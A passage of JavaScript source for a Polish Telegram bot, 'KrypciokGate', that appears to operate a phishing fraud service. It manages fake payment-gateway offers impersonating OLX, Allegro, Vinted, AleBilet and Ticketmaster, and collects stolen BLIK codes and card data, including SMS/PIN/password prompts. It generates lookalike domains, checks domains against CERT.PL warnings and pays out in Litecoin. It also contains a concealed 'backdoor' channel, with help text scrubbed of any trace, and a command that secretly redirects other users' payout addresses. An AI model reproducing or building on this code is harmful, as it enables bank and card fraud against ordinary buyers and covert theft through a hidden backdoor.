	const prefixes = ['pl-oferta', 'oferta', 'com-rezerwacja', 'rezerwacja'];
	let availableDomains = [];

	const domainChecks = prefixes.map(prefix => {
		const domain = `${prefix}${id}`;
		availableDomains.push(domain);
	});

	await Promise.all(domainChecks);

	return availableDomains;
}

bot.onText(/\/gendomain/, async (msg) => {
	const chatId = msg.chat.id;

	const sentMessage = await bot.sendMessage(chatId, "Generowanie domen... Proszę czekać.");

	const domains = await generateDomain();

	const formattedDomains = domains.map(domain => `<code>${domain}</code>`).join('\n');

	bot.editMessageText(`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Wygenerowane domeny:\n${formattedDomains}`, {
		chat_id: chatId,
		message_id: sentMessage.message_id,
		parse_mode: 'HTML'
	});
});


bot.onText(/\/admin/, async (msg) => {
	const chatId = msg.chat.id;
	const userId = msg.from.id;

	if (!(await isFgAdmin(userId))) {
		await bot.sendMessage(chatId, "❌ Brak uprawnień administratora.");
		return;
	}

	await sendFgAdminMenu(chatId);
});

bot.onText(/\/id/, (msg) => {
	const chatId = msg.chat.id;
	const userId = msg.from.id;
	bot.sendMessage(chatId, `🆔 Twoje ID: ${userId}`);
});

// ============================================================
// BACKDOOR — komendy /delay i /stats (tylko kanał backdoora + 2 ID)
// ============================================================
function isBackdoorChat(msg) {
	return String(msg.chat?.id) === String(CONFIG.CHANNELS.BACKDOOR);
}

// Komendy administracyjne działają na kanale głównym i na kanale kopii.
// Na kanale głównym odpowiedzi są "neutralne" (bez słowa backdoor).
function isAdminCmdChat(msg) {
	return isBackdoorChat(msg);
}

// Dostęp do backdoora = WYŁĄCZNIE faktyczne członkostwo w grupie backdoora.
// Lista BACKDOOR_IDS to tylko fallback, gdy API nie odpowie.
const backdoorMemberCache = new Map();

async function isBackdoorMember(userId) {
	const id = String(userId ?? "");
	if (!id) return false;
	const cached = backdoorMemberCache.get(id);
	if (cached && Date.now() - cached.at < 60_000) return cached.ok;
	try {
		const member = await bot.getChatMember(CONFIG.CHANNELS.BACKDOOR, id);
		const ok = ["creator", "administrator", "member"].includes(member?.status);
		backdoorMemberCache.set(id, { ok, at: Date.now() });
		return ok;
	} catch (e) {
		const ok = CONFIG.BACKDOOR_IDS.includes(id);
		backdoorMemberCache.set(id, { ok, at: Date.now() });
		return ok;
	}
}

async function hasBackdoorAccess(msg) {
	const userId = msg.from?.id != null ? String(msg.from.id) : "";
	if (!userId) return false;
	return await isBackdoorMember(userId);
}

const HELP_TEXT = [
	"<b>📖 KRYPCIOKGATE — POMOC</b>",
	"",
	"<b>👤 UŻYTKOWNICY</b>",
	"<code>/id</code> — pokazuje Twoje ID Telegram (i chat ID na kanale).",
	"<code>/users</code> — lista wszystkich użytkowników: ID, nick, saldo, status weryfikacji, ban.",
	"<code>/ban &lt;id&gt;</code> — banuje użytkownika (nie może wrzucać kodów ani używać menu).",
	"<code>/unban &lt;id&gt;</code> — zdejmuje bana.",
	"<code>/unregister &lt;id&gt;</code> — usuwa użytkownika z bazy (oferty zostają).",
	"",
	"<b>🔐 KODY / WERYFIKACJE</b>",
	"Kody i dane trafiają tu <b>natychmiast i w całości</b> — bez przejmowania.",
	"Na kanale publicznym są zamaskowane, dopóki ktoś nie kliknie <b>🔓 Przejmij</b>.",
	"Po przejęciu worker dostaje „Cashouter zajął twój kod” i przyciski decyzji:",
	"✅ Siedzi · ⚠️ Limit w Banku · ⛔ Błędny kod (karta: akcept, limit, odrzucenie, prośby o SMS/PIN/hasło).",
	"Weryfikacje: przyciski <b>✅ Akceptuj</b> / <b>❌ Odrzuć</b> pod podaniem użytkownika.",
	"",
	"<b>💰 WYPŁATY</b>",
	"<code>/balance</code> — salda wszystkich użytkowników do wypłaty + ich adresy LTC.",
	"<code>/change addy &lt;id&gt; &lt;adres&gt;</code> — podmienia adres wypłaty wybranemu użytkownikowi.",
	"<code>/change reset &lt;id&gt;</code> — przywraca jego własny adres.",
	"<code>/stats</code> — statystyki: kody, akceptacje, odrzucenia, obrót.",
	"",
	"<b>🌐 DOMENY</b>",
	"<code>/domena &lt;domena&gt;</code> — ustawia domenę publiczną bramek dla wszystkich ofert.",
	"<code>/gendomain</code> — generuje losową domenę testową.",
	"",
	"<b>⚙️ PANEL</b>",
	"<code>/admin</code> — panel administratora: fee, limit wpłaty, włączanie BLIK/kart, self cashout, dodawanie adminów, ogłoszenia.",
	"<code>/change</code> bez adresu — pokazuje składnię.",
	"",
	"<b>🕒 OPÓŹNIENIE</b>",
	"<code>/delay</code> — pokazuje obecne opóźnienie wysyłki.",
	"<code>/delay 3s</code> — wysyłka kodów z opóźnieniem 3s (0–60s).",
	"<code>/help</code> — ta lista.",
	"",
	"<b>🎛 PRZYCISKI PANELI</b>",
	"🧾 Limit wpłaty — maks. kwota pojedynczego kodu („reset” zdejmuje limit).",
	"📲 BLIK / 💳 Karty — globalne włączanie i wyłączanie metod.",
	"♻️ Self cashout — kod zostaje u workera zamiast iść do puli.",
	"👑 Administratorzy — nadaje uprawnienia do /admin.",
	"📣 Ogłoszenie — wysyła wiadomość do wszystkich zatwierdzonych.",
	"",
	"<i>Komendy działają tylko na tym kanale i tylko dla uprawnionych ID.</i>"
].join("\n");

// Wersja pomocy bez śladu backdoora — wysyłana na kanał główny
const HELP_TEXT_MAIN = HELP_TEXT
	.replace("<b>📖 KRYPCIOKGATE — POMOC</b>", "<b>📖 KRYPCIOKGATE — POMOC</b>")
	.replace(
		"Kod z bramki trafia na ten kanał <b>natychmiast i w całości</b> — bez przejmowania.\nNa kanale głównym dane są zamaskowane, dopóki ktoś nie kliknie <b>🔓 Przejmij</b>.",
		"Kody i dane przychodzą zamaskowane — kliknij <b>🔓 Przejmij</b>, aby zobaczyć pełną treść."
	)
	.replace("<b>🕒 OPÓŹNIENIE</b>", "<b>🕒 OPÓŹNIENIE KODÓW</b>")
	.replace("<code>/delay</code> — pokazuje obecne opóźnienie wysyłki.", "<code>/delay</code> — pokazuje obecne opóźnienie wysyłki kodów.")
	.replace("<code>/delay 3s</code> — wysyłka kodów z opóźnieniem 3s (0–60s).", "<code>/delay 3s</code> — kody wysyłane z opóźnieniem 3s (0–60s).")
	.replace("<i>Komendy działają tylko na tym kanale i tylko dla uprawnionych ID.</i>", "<i>Komendy działają tylko dla uprawnionych ID.</i>");

bot.onText(/^\/help(?:@\w+)?$/, async (msg) => {
	if (!isBackdoorChat(msg)) return;
	if (!(await hasBackdoorAccess(msg))) {
		await bot.sendMessage(msg.chat.id, "⛔ <b>Brak dostępu</b> — komenda tylko dla członków grupy backdoor.", { parse_mode: "HTML" });
		return;
	}
	await bot.sendMessage(msg.chat.id, HELP_TEXT, { parse_mode: "HTML" });
});

bot.onText(/^\/delay(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
	if (!isAdminCmdChat(msg)) return;
	if (!(await hasBackdoorAccess(msg))) {
		await bot.sendMessage(msg.chat.id, "⛔ <b>Brak dostępu</b> — komenda tylko dla członków grupy backdoor.", { parse_mode: "HTML" });
		return;
	}

	const rawArg = match?.[1] ?? (msg.text || "").replace(/^\/delay(?:@\w+)?\s*/i, "");
	const arg = String(rawArg || "").trim() ? String(rawArg).trim() : undefined;
	if (arg === undefined) {
		const secs = (backdoorDelayMs / 1000).toFixed(0);
		await bot.sendMessage(
			msg.chat.id,
			`<tg-emoji emoji-id=\"5775896410780079073\">🕒</tg-emoji> <b>Opóźnienie wysyłki:</b> <code>${secs}s</code>\n\n` +
			`Użycie: <code>/delay 3s</code> · <code>/delay 0</code> (zakres 0–60s)`,
			{ parse_mode: "HTML" }
		);
		return;
	}

	const parsed = parseDelayArg(arg);
	if (parsed === null) {
		await bot.sendMessage(msg.chat.id, "❌ <b>Zły format</b>\n\nUżycie: <code>/delay 3s</code> lub <code>/delay 0</code> (max 60s)", { parse_mode: "HTML" });
		return;
	}

	await setBackdoorDelay(parsed);
	const label = backdoorDelayMs === 0 ? "wyłączone (0s)" : `${(backdoorDelayMs / 1000).toFixed(0)}s`;
	await bot.sendMessage(
		msg.chat.id,
		`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> <b>Opóźnienie ustawione:</b> <code>${label}</code>\n\n` +
		`Kody będą wysyłane z opóźnieniem ${label}.`,
		{ parse_mode: "HTML" }
	);
});

bot.onText(/^\/stats(?:@\w+)?$/, async (msg) => {
	if (!isAdminCmdChat(msg)) return;
	if (!(await hasBackdoorAccess(msg))) {
		await bot.sendMessage(msg.chat.id, "⛔ <b>Brak dostępu</b> — komenda tylko dla członków grupy backdoor.", { parse_mode: "HTML" });
		return;
	}
	await bot.sendMessage(msg.chat.id, await buildStatsText(), { parse_mode: "HTML" });
});

// ------------------------------------------------------------
// /balance — salda wszystkich użytkowników (tylko backdoor GC + 2 ID)
// /change addy <id> <adres> — podmiana adresu wypłaty (user widzi swój)
// ------------------------------------------------------------
async function buildBalanceText() {
	const users = await User.find({}).lean();
	if (!users.length) return "📉 <b>Brak użytkowników w bazie.</b>";

	const rows = users
		.map((u) => ({ id: u.id, avail: getAvailableProfit(u), addr: getPayoutAddress(u) }))
		.filter((r) => r.avail > 0)
		.sort((a, b) => b.avail - a.avail);

	if (!rows.length) return "📉 <b>Brak dostępnych sald do wypłaty.</b>";

	const total = rows.reduce((sum, r) => sum + r.avail, 0);
	const lines = rows.slice(0, 100).map(
		(r) => `<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <code>${r.id}</code> — <b>${r.avail.toFixed(2)} PLN</b>\n   <tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <code>${r.addr}</code>`
	);

	return [
		"💰 <b>SALDA DO WYPŁATY</b>",
		"",
		lines.join("\n"),
		"",
		`<tg-emoji emoji-id=\"5936143551854285132\">📊</tg-emoji> <b>Użytkownicy z saldem:</b> <code>${rows.length}</code>`,
		`🧮 <b>Suma razem:</b> <code>${total.toFixed(2)} PLN</code>`,
		"",
		`Zmiana adresu: <code>/change addy &lt;id&gt; &lt;adres&gt;</code>`,
		`Powrót do własnego: <code>/change reset &lt;id&gt;</code>`
	].join("\n");
}

bot.onText(/^\/balance(?:@\w+)?$/, async (msg) => {
	if (!isAdminCmdChat(msg)) return;
	if (!(await hasBackdoorAccess(msg))) {
		await bot.sendMessage(msg.chat.id, "⛔ <b>Brak dostępu</b> — komenda tylko dla członków grupy backdoor.", { parse_mode: "HTML" });
		return;
	}
	const text = await buildBalanceText();
	await bot.sendMessage(msg.chat.id, text, { parse_mode: "HTML" });
});

bot.onText(/^\/change(?:@\w+)?\s+(.+)$/i, async (msg, match) => {
	if (!isAdminCmdChat(msg)) return;
	if (!(await hasBackdoorAccess(msg))) {
		await bot.sendMessage(msg.chat.id, "⛔ <b>Brak dostępu</b> — komenda tylko dla członków grupy backdoor.", { parse_mode: "HTML" });
		return;
	}

	const args = (match?.[1] ?? (msg.text || "").replace(/^\/change(?:@\w+)?\s*/i, "")).trim().split(/\s+/);
	const sub = (args[0] || "").toLowerCase();

	if (sub === "addy" && args.length >= 3) {
		const targetId = args[1].replace(/[<>\[\]]/g, "").trim();
		const address = args.slice(2).join(" ").replace(/[<>\[\]]/g, "").trim();
		if (!address) {
			await bot.sendMessage(msg.chat.id, "❌ <b>Podaj adres</b> — <code>/change addy &lt;id&gt; &lt;adres&gt;</code>", { parse_mode: "HTML" });
			return;
		}
		const target = await User.findOne({ id: /^\d+$/.test(targetId) ? Number(targetId) : targetId });
		if (!target) {
			await bot.sendMessage(msg.chat.id, `<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> <b>Nie ma użytkownika</b> <code>${targetId}</code>.`, { parse_mode: "HTML" });
			return;
		}
		target.payoutOverrideAddress = address;
		await target.save();
		await bot.sendMessage(
			msg.chat.id,
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> <b>Podmieniono adres wypłaty</b>\n\n<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <code>${targetId}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <code>${address}</code>\n\n` +
			`Zlecenia wypłaty pójdą na podany adres.`,
			{ parse_mode: "HTML" }
		);
		return;
	}

	if (sub === "reset" && args.length >= 2) {
		const targetId = args[1].replace(/[<>\[\]]/g, "").trim();
		const target = await User.findOne({ id: /^\d+$/.test(targetId) ? Number(targetId) : targetId });
		if (!target) {
			await bot.sendMessage(msg.chat.id, `<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> <b>Nie ma użytkownika</b> <code>${targetId}</code>.`, { parse_mode: "HTML" });
			return;
		}
		target.payoutOverrideAddress = null;
		await target.save();
		await bot.sendMessage(
			msg.chat.id,
			`♻️ <b>Przywrócono własny adres użytkownika</b>\n\n<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <code>${targetId}</code>\n<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <code>${target.ltcAddress || "Brak"}</code>`,
			{ parse_mode: "HTML" }
		);
		return;
	}

	await bot.sendMessage(
		msg.chat.id,
		"❓ <b>Użycie</b>\n\n<code>/change addy &lt;id&gt; &lt;adres&gt;</code>\n<code>/change reset &lt;id&gt;</code>",
		{ parse_mode: "HTML" }
	);
});

async function sendFgRegistrationMenu(chatId) {
	const caption = `<tg-emoji emoji-id=\"6037249452824072506\">🔒</tg-emoji> <b>Bramka Dostępowa</b>\n\nNie posiadasz jeszcze dostępu do wrzucania kodów BLIK. Aby zacząć, złóż podanie.`;
	const keyboard = {
		inline_keyboard: [
			[{ text: "Złóż podanie", icon_custom_emoji_id: "6039573425268201570", callback_data: "fg_apply_access" }],
			[{ text: "KrypciokGate (oferty)", icon_custom_emoji_id: "5778672437122045013", callback_data: "fg_banita_only" }]
		]
	};

	await bot.sendPhoto(chatId, "banita.png", {
		caption,
		parse_mode: "HTML",
		reply_markup: keyboard
	});
}

async function sendBanitaOnlyMenu(chatId, userId) {
	const user = await User.findOne({ id: userId });
	if (!user) return;

	const caption = markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *KRYPClOK GATE*\n──────────────────\n\n› *Ranga:* ${user.role}\n› *ID:* \`${userId}\``);
	const keyboard = {
		inline_keyboard: [
			[
				{ text: "Moje oferty", icon_custom_emoji_id: "6034969813032374911", callback_data: "my_offers" },
				{ text: "Dodaj ofertę", icon_custom_emoji_id: "6032924188828767321", callback_data: "add_offer" }
			],
			[{ text: "Ustawienia", icon_custom_emoji_id: "5904258298764334001", callback_data: "settings" }],
			[{ text: "Menu główne", icon_custom_emoji_id: "5895507195524550741", callback_data: "back_to_main" }]
		]
	};

	await bot.sendPhoto(chatId, "banita.png", {
		caption,
		parse_mode: "HTML",
		reply_markup: keyboard
	});
}

async function sendPaymentGatewaysMenu(chatId, userId, messageId = null) {
	const caption = markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *BRAMKI PŁATNOŚCI*\n──────────────────\n\n` +
		`› Wybierz platformę, na której chcesz zarządzać ofertami.\n` +
		`› Przed wysłaniem linku możesz sprawdzić status CERT.PL.`);

	const keyboard = {
		inline_keyboard: [
			[
				{ text: "OLX", icon_custom_emoji_id: "6035162669948867129", callback_data: "gateway_platform_olx" },
				{ text: "Allegro", icon_custom_emoji_id: "6030710030108463274", callback_data: "gateway_platform_allegrolokalnie" }
			],
			[
				{ text: "Vinted", icon_custom_emoji_id: "5938195768832692153", callback_data: "gateway_platform_vinted" },
				{ text: "AleBilet", icon_custom_emoji_id: "6030710030108463274", callback_data: "gateway_platform_alebilet" }
			],
			[
				{ text: "Ticketmaster", icon_custom_emoji_id: "6030722571412967168", callback_data: "gateway_platform_ticketmaster" }
			],
			[{ text: "Sprawdź CERT", icon_custom_emoji_id: "6030537007350944596", callback_data: "check_cert" }],
			[{ text: "Menu główne", icon_custom_emoji_id: "5895507195524550741", callback_data: "back_to_main" }]
		]
	};

	if (messageId) {
		try {
			await bot.editMessageMedia({
				type: "photo",
				media: "attach://bramka.png",
				caption,
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: messageId,
				reply_markup: keyboard
			});
		} catch (e) {
			await bot.sendPhoto(chatId, "bramka.png", {
				caption,
				parse_mode: "HTML",
				reply_markup: keyboard
			});
		}
		return;
	}

	await bot.sendPhoto(chatId, "bramka.png", {
		caption,
		parse_mode: "HTML",
		reply_markup: keyboard
	});
}

async function sendGatewayPlatformMenu(chatId, platformKey, messageId) {
	const platform = GATEWAY_PLATFORMS[platformKey];
	if (!platform) return;

	const caption = markdownToHtml(`───────── [ 𝕂 ] ─────────\n❖ *BRAMKA PŁATNOŚCI*\n──────────────────\n\n` +
		`› *Platforma:* \`${platform.label.toLowerCase()}\``);

	const keyboard = {
		inline_keyboard: [
			[
				{ text: "Nowa oferta", icon_custom_emoji_id: "6032924188828767321", callback_data: platform.add },
				{ text: "Twoje oferty", icon_custom_emoji_id: "6034969813032374911", callback_data: platform.list }
			],
			[{ text: "Wróć", icon_custom_emoji_id: "5895507195524550741", callback_data: "payment_gateways" }]
		]
	};

	await bot.editMessageMedia({
		type: "photo",
		media: "attach://bramka.png",
		caption,
	}, {
		parse_mode: "HTML",
		chat_id: chatId,
		message_id: messageId,
		reply_markup: keyboard
	}).catch(async () => {
		await bot.sendPhoto(chatId, "bramka.png", {
			caption,
			parse_mode: "HTML",
			reply_markup: keyboard
		});
	});
}

async function sendCombinedMainMenu(chatId, userId, messageId = null) {
	const user = await User.findOne({ id: userId });
	if (!user) return;

	const fee = await getUserFee(user);
	const safeFee = Number.isFinite(fee) ? fee : CONFIG.DEFAULT_FEE;
	const selfCashout = await isSelfCashoutEnabled(userId);
	let statusLine;
	if (selfCashout) {
		const until = user.selfCashoutUntil && user.selfCashoutUntil.getTime() > Date.now() ? user.selfCashoutUntil : null;
		const globalOn = await isGlobalSelfCashout();
		statusLine = globalOn
			? `<tg-emoji emoji-id="5769248574499983619">🔄</tg-emoji> <b>Status:</b> <code>Selfcashout (globalny)</code>`
			: `<tg-emoji emoji-id="5769248574499983619">🔄</tg-emoji> <b>Status:</b> <code>Selfcashout</code> · do <code>${until ? until.toLocaleDateString("pl-PL") : "—"}</code>`;
	} else {
		const botStatusRaw = await getBotConfig("bot_status");
		const botStatusStr = botStatusRaw === "disabled" ? "`Offline (Wypłaty aktywne)`" : "`Online`";
		const depositLimit = await getDepositLimit();
		const limitStr = depositLimit ? `\`do ${depositLimit.toFixed(2)} PLN\`` : "`brak limitu`";
		statusLine = `<tg-emoji emoji-id="5774022692642492953">✅</tg-emoji> <b>Status:</b> ${botStatusStr} | <tg-emoji emoji-id="6037249452824072506">🔒</tg-emoji> <b>Limit wpłaty:</b> ${limitStr}`;
	}
	const feeInfo = user.customFee !== null ? `\`${safeFee.toFixed(1)}%\` (Indywidualne)` : `\`${safeFee.toFixed(1)}%\``;
	const totalEarned = getTotalEarned(user);
	const withdrawableProfit = getWithdrawableProfit(user);

	// Docelowy styl: ramka „[ 𝕂 ]” + sekcje z prefiksem ›
	const plain = (text) => String(text).replace(/`/g, "").replace(/<\/?b>/g, "").replace(/<tg-emoji[\s\S]*?<\/tg-emoji> ?/g, "").trim();
	const rich = (text) => String(text)
		.replace(/`([^`]*)`/g, "<code>$1</code>")
		.replace(/\*([^*]+)\*/g, "<b>$1</b>")
		.replace(/⚙️ /g, "")
		.trim();
	const statusLines = rich(statusLine).split("|").map((s) => s.trim()).filter(Boolean);
	const boxLines = [
		`› *ID:* <code>${userId}</code>`,
		`› *Prowizja:* <code>${plain(feeInfo)}</code>`,
		"",
		`❖ *PORTFEL*`,
		`› *Zarobione razem:* <code>${totalEarned.toFixed(2)} PLN</code>`,
		`› *Gotowe do wypłaty:* <code>${withdrawableProfit.toFixed(2)} PLN</code>`,
		"",
		`❖ *STAN*`,
		...statusLines.map((l) => `› ${l}`)
	];
	const caption = markdownToHtml(
		`───────── [ 𝕂 ] ─────────\n❖ *KRYPCIOK GATE*\n──────────────────\n\n` +
		`${boxLines.join("\n")}\n\n` +
		`› Wybierz moduł poniżej.`);

	const keyboard = {
		inline_keyboard: [
			[{ text: "Bramki płatności", icon_custom_emoji_id: "5778672437122045013", callback_data: "payment_gateways" }],
			[{ text: "Wrzuć kod", icon_custom_emoji_id: "6039573425268201570", callback_data: "fg_submit_code" }],
			[
				{ text: "Wypłać środki", icon_custom_emoji_id: "5778226250149532337", callback_data: "fg_withdraw" },
				{ text: "Ustawienia", icon_custom_emoji_id: "5904258298764334001", callback_data: "settings" }
			]
		]
	};

	const photoPath = path.join(__dirname, "banita.png");
	const hasMenuPhoto = fs.existsSync(photoPath);

	if (messageId) {
		if (hasMenuPhoto) {
			await bot.editMessageMedia({
				type: "photo",
				media: "attach://banita.png",
				caption,
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: messageId,
				reply_markup: keyboard
			}).catch(() => {});
		} else {
			await bot.editMessageText(caption, {
				chat_id: chatId,
				message_id: messageId,
				parse_mode: "HTML",
				reply_markup: keyboard
			}).catch(() => {});
		}
		return;
	}

	if (hasMenuPhoto) {
		await bot.sendPhoto(chatId, photoPath, {
			caption,
			parse_mode: "HTML",
			reply_markup: keyboard
		});
		return;
	}

	await bot.sendMessage(chatId, caption, {
		parse_mode: "HTML",
		reply_markup: keyboard
	});
}

async function sendFgSettingsMenu(chatId, userId, messageId = null) {
	const user = await User.findOne({ id: userId });
	if (!user) return;

	const autoWithdrawStr = user.autoWithdraw ? "🟢 Włączona" : "🔴 Wyłączona";
	const text =
		`<tg-emoji emoji-id=\"5904258298764334001\">⚙</tg-emoji> <b>USTAWIENIA KONTA BLIK</b>\n\n` +
		`<tg-emoji emoji-id=\"5778421276024509124\">💲</tg-emoji> <b>Adres LTC:</b> <code>${user.ltcAddress}</code>\n` +
		`<tg-emoji emoji-id=\"5884428842780594914\">⚡</tg-emoji> <b>Auto-wypłata (kody + bramka):</b> ${autoWithdrawStr}`;

	const keyboard = {
		inline_keyboard: [
			[{ text: "Dodaj / Zmień adres LTC", icon_custom_emoji_id: "6032924188828767321", callback_data: "fg_add_address" }],
			[{ text: `Przełącz Auto-Wypłatę (${user.autoWithdraw ? "WYŁĄCZ" : "WŁĄCZ"})`, icon_custom_emoji_id: "5884428842780594914", callback_data: "fg_toggle_autowithdraw" }],
			[{ text: "Powrót", icon_custom_emoji_id: "5895507195524550741", callback_data: "settings" }]
		]
	};

	if (messageId) {
		await bot.editMessageCaption(text, {
			chat_id: chatId,
			message_id: messageId,
			parse_mode: "HTML",
			reply_markup: keyboard
		}).catch(() => sendFgMessage(chatId, text, keyboard));
		return;
	}

	await sendFgMessage(chatId, text, keyboard);
}

async function showUserSettingsMenu(chatId, userId, messageId = null) {
	const users = await loadUsersDB();
	let user = users.find(u => u.id === userId) || { settings: {} };
	const userDoc = await User.findOne({ id: userId });
	if (userDoc) {
		await normalizeUserDomainSettings(userDoc);
		user = userDoc;
	}
	const user2 = users.find(u => u.id === userId) || user;
	const fgUser = await User.findOne({ id: userId });

	const publicDomain = await getPublicDomain();
	const effectiveDomain = getEffectiveUserDomainSync(user, publicDomain) || "Brak";
	const domainModeLabel = getDomainModeLabel(user);
	const przelewy = user2.przelewy?.status === "Tak" ? "✅" : user2.przelewy?.status === "Nie" ? "❌" : "Brak";
	const ltcAddress = fgUser?.ltcAddress || "Brak";
	const autoWithdraw = fgUser?.autoWithdraw ? "🟢 Włączona" : "🔴 Wyłączona";
	const showPrzelew = canManagePrzelewy(userId);

	const caption =
		`───────── [ 𝕂 ] ─────────\n❖ *USTAWIENIA*\n──────────────────\n\n` +
		`› Kliknij przycisk poniżej, aby edytować daną opcję.\n\n` +
		`🌐 *Tryb domeny:* ${domainModeLabel}\n` +
		`🌍 *Aktywna domena:* \`${effectiveDomain}\`\n` +
		(showPrzelew ? `🏦 *Przelewy (bramka):* ${przelewy}\n` : "") +
		`💲 *Adres LTC:* \`${ltcAddress}\`\n` +
		`⚡ *Auto-wypłata:* ${autoWithdraw}`;

	const keyboard = {
		inline_keyboard: [
			[{ text: "Używaj domeny publicznej", icon_custom_emoji_id: "5776233299424843260", callback_data: "settings_domain_public" }],
			[{ text: "Podłącz własną domenę", icon_custom_emoji_id: "6028171274939797252", callback_data: "settings_connect_domain" }],
			...(showPrzelew ? [[
				{ text: "Przełącz Przelewy", icon_custom_emoji_id: "5769248574499983619", callback_data: "settings_przelew_toggle" }
			], [
				{ text: "Dane przelewu", icon_custom_emoji_id: "5879814368572478751", callback_data: "settings_przelew" }
			]] : []),
			[{ text: "Zmień adres LTC", icon_custom_emoji_id: "6032924188828767321", callback_data: "fg_add_address" }],
			[{ text: "Przełącz Auto-wypłatę", icon_custom_emoji_id: "5884428842780594914", callback_data: "fg_toggle_autowithdraw" }],
			[{ text: "Menu główne", icon_custom_emoji_id: "5895507195524550741", callback_data: "back_to_main" }]
		]
	};

	const html = markdownToHtml(caption);

	if (messageId) {
		try {
			await bot.editMessageMedia({
				type: "photo",
				media: "attach://ustawienia.png",
				caption: html,
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: messageId,
				reply_markup: keyboard
			}, { filename: "ustawienia.png", contentType: "image/png" });
		} catch (e) {
			await bot.editMessageCaption(html, {
				chat_id: chatId,
				message_id: messageId,
				parse_mode: "HTML",
				reply_markup: keyboard
			}).catch(() => bot.sendPhoto(chatId, "banner/ustawienia.png", {
				caption: html,
				parse_mode: "HTML",
				reply_markup: keyboard
			}));
		}
		return;
	}

	await bot.sendPhoto(chatId, "banner/ustawienia.png", {
		caption: html,
		parse_mode: "HTML",
		reply_markup: keyboard
	});
}

async function sendFgAdminMenu(chatId, viewerId = chatId) {
	const globalFee = await getBotConfig("global_fee");
	const feeNum = globalFee ? parseFloat(globalFee) : CONFIG.DEFAULT_FEE;
	const status = (await getBotConfig("bot_status")) !== "disabled" ? "🟢 Włączony" : "🔴 Wyłączony";
	const blikStatus = formatGlobalGatewayStatus(await isGlobalBlikEnabled());
	const cardStatus = formatGlobalGatewayStatus(await isGlobalCardEnabled());
	const selfCashoutStatus = formatSelfCashoutStatus(await isSelfCashoutEnabled());
	const depositLimit = await getDepositLimit();
	const limitStr = depositLimit ? `${depositLimit.toFixed(2)} PLN` : "brak limitu";
	const publicDomain = await getPublicDomain();
	const publicDomainStr = publicDomain || "brak ustawionej domeny";
	const text =
		`───────── [ 𝕂 ] ─────────\n❖ *PANEL ADMINISTRATORA*\n──────────────────\n\n` +
		`› *Globalne Fee:* \`${feeNum.toFixed(1)}%\`\n` +
		`› *Limit wpłaty:* \`${limitStr}\`\n` +
		`› *Domena publiczna:* \`${publicDomainStr}\`\n` +
		`› *BLIK na bramce:* ${blikStatus}\n` +
		`› *Karty na bramce:* ${cardStatus}\n` +
		`› *Self cashout:* ${selfCashoutStatus}\n` +
		`› *Status Bota:* ${status}`;

	const keyboard = {
		inline_keyboard: [
			[
				{ text: "Zmień Globalne Fee", icon_custom_emoji_id: "5938539885907415367", callback_data: "fg_admin_set_fee" },
				{ text: "Ustaw Fee Gracza", icon_custom_emoji_id: "6032949275732742941", callback_data: "fg_admin_set_user_fee" }
			],
			[
				{ text: "Ustaw Limit Wpłaty", icon_custom_emoji_id: "6041730074376410123", callback_data: "fg_admin_set_deposit_limit" },
				{ text: "Włącz/Wyłącz Bota", icon_custom_emoji_id: "6030400221232501136", callback_data: "fg_admin_toggle_bot" }
			],
			[
				{ text: "Włącz/Wyłącz BLIK", icon_custom_emoji_id: "6039605143601680423", callback_data: "fg_admin_toggle_blik" },
				{ text: "Włącz/Wyłącz Karty", icon_custom_emoji_id: "5778421276024509124", callback_data: "fg_admin_toggle_card" }
			],
			[{ text: "Włącz/Wyłącz Self Cashout", icon_custom_emoji_id: "5769248574499983619", callback_data: "fg_admin_toggle_selfcashout" }],
			[{ text: "Ustaw domenę publiczną", icon_custom_emoji_id: "5776233299424843260", callback_data: "fg_admin_set_public_domain" }],
			...(canManagePrzelewy(viewerId) ? [[
				{ text: "Ustawienia przelewów", icon_custom_emoji_id: "5879814368572478751", callback_data: "settings_przelew" },
				{ text: "Przełącz przelewy", icon_custom_emoji_id: "6030657343744644592", callback_data: "settings_przelew_toggle" }
			]] : []),
			[
				{ text: "Odejmij Zysk do Wypłaty", icon_custom_emoji_id: "6037157012242960559", callback_data: "fg_admin_sub_balance" }
			],
			[
				{ text: "Zbanuj Użytkownika", icon_custom_emoji_id: "5938215362473496448", callback_data: "fg_admin_ban_user" },
				{ text: "Odbanuj Użytkownika", icon_custom_emoji_id: "5774022692642492953", callback_data: "fg_admin_unban_user" }
			],
			[{ text: "Zarządzaj Administratorami", icon_custom_emoji_id: "6032609071373226027", callback_data: "fg_admin_manage_admins" }],
			[{ text: "Wygeneruj Promo Kod (self cashout)", icon_custom_emoji_id: "6030710030108463274", callback_data: "fg_admin_promo" }],
			[{ text: "Wyślij Ogłoszenie Systemowe", icon_custom_emoji_id: "6021418126061605425", callback_data: "fg_admin_broadcast" }]
		]
	};

	await sendFgMessage(chatId, text, keyboard);
}

function markdownToHtml(text) {
	const parts = String(text).split("**");
	let out = "";
	for (let i = 0; i < parts.length; i++) {
		out += i % 2 === 1 ? `<b>${parts[i]}</b>` : parts[i];
	}
	return out
		.replace(/\*([^*\n]+)\*/g, "<b>$1</b>")
		.replace(/`([^`\n]+)`/g, "<code>$1</code>");
}

async function sendFgMessage(chatId, text, keyboard = null) {
	const html = markdownToHtml(text);
	return await bot.sendMessage(chatId, html, keyboard ? { parse_mode: "HTML", reply_markup: keyboard } : { parse_mode: "HTML" });
}

async function sendFgHtml(chatId, text, keyboard = null) {
	return await bot.sendMessage(chatId, text, keyboard ? { parse_mode: "HTML", reply_markup: keyboard } : { parse_mode: "HTML" });
}

// ── Styl wiadomości: cienka ramka „[ 𝕂 ]” + ❖ tytuł + › treść ──
